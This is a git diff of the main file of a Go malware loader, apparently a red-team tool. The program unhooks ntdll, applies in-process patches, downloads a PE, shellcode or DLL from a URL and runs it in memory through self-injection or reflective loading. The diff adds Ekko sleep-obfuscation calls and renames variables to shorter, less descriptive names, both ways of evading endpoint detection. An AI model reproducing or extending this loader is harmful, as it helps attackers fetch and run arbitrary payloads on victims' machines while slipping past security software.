@@ -8,26 +8,30 @@ import (
 	"loader/pkg/dll"
 	"github.com/carved4/go-native-syscall"
 	"loader/pkg/net"
+	"loader/pkg/wrappers"
+	"loader/pkg/ekko"
 )
 
 func main() {
 	winapi.UnhookNtdll()
 	winapi.ApplyAllPatches()
-	
+
+	ekko.EkkoSleep(100)
+
 	var (
-		usePE       = flag.Bool("pe", false, "Load and execute PE file")
-		useShellcode = flag.Bool("shellcode", false, "Execute shellcode")
-		useDLL      = flag.Bool("dll", false, "Load and execute DLL")
+		uPE       = flag.Bool("pe", false, "Load and execute PE file")
+		uSh = flag.Bool("shellcode", false, "Execute shellcode")
+		uDL      = flag.Bool("dll", false, "Load and execute DLL")
 		url         = flag.String("url", "", "URL to download the file from")
-		funcName    = flag.String("func", "", "Function name for DLL execution")
+		fn    = flag.String("func", "", "Function name for DLL execution")
 	)
 	
 	flag.Parse()
 	
 	flagCount := 0
-	if *usePE { flagCount++ }
-	if *useShellcode { flagCount++ }
-	if *useDLL { flagCount++ }
+	if *uPE { flagCount++ }
+	if *uSh { flagCount++ }
+	if *uDL { flagCount++ }
 	
 	if flagCount == 0 {
 		fmt.Println("Usage: program [-pe|-shellcode|-dll] -url <URL> [-func <function_name>]")
@@ -52,19 +56,22 @@ func main() {
 		log.Fatalf("[ERROR] Failed to download file: %v\n", err)
 	}
 	
-	if *usePE {
+	if *uPE {
+		ekko.EkkoSleep(100)
 		err := pe.LoadPEFromBytes(fileBytes)
 		if err != nil {
 			log.Fatalf("[ERROR] Failed to load PE: %v\n", err)
 		}
 		
-	} else if *useShellcode {
-		err := winapi.NtInjectSelfShellcode(fileBytes)
+	} else if *uSh {
+		ekko.EkkoSleep(100)
+		err := wrappers.NtInjectSelfShellcode(fileBytes)
 		if err != nil {
-			winapi.NtInjectSelfShellcode(fileBytes)
+			wrappers.NtInjectSelfShellcode(fileBytes)
 		}
-	} else if *useDLL {
-		err := dll.LoadDLL(fileBytes, *funcName)
+	} else if *uDL {
+		ekko.EkkoSleep(100)
+		err := dll.LoadDLL(fileBytes, *fn)
 		if err != nil {
 			log.Fatalf("[ERROR] Failed to load DLL: %v\n", err)
 		}
